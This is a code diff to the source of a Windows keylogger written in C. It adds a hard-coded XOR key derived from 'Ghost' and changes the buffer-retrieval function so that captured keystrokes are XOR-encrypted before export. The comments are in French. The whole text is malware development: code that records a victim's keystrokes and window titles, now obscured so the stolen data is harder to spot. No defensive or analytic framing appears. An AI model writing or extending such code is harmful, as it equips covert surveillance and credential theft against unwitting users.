@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <surveillance/keylogger.h>
+#include <crypto/xor.h>
 #include <stdio.h>
 
 // Configuration
@@ -13,6 +14,9 @@ static char g_buffer[KEYLOG_BUFFER_SIZE];
 static DWORD g_buffer_pos = 0;
 static CRITICAL_SECTION g_cs;
 static char g_last_window[256] = {0};
+
+// Clé de chiffrement simple pour les logs (dérivée de "Ghost")
+static const uint8_t KEYLOG_KEY[] = {0x47, 0x68, 0x6f, 0x73, 0x74};
 
 // Key names for special keys
 static const char* GetKeyName(int vkCode) {
@@ -176,6 +180,10 @@ BOOL Keylogger_GetBuffer(char** buffer, DWORD* size) {
     }
     
     memcpy(*buffer, g_buffer, g_buffer_pos);
+    
+    // Chiffrement des données avant export
+    xor_encrypt((uint8_t*)*buffer, g_buffer_pos, KEYLOG_KEY, sizeof(KEYLOG_KEY));
+    
     (*buffer)[g_buffer_pos] = '\0';
     *size = g_buffer_pos;
     
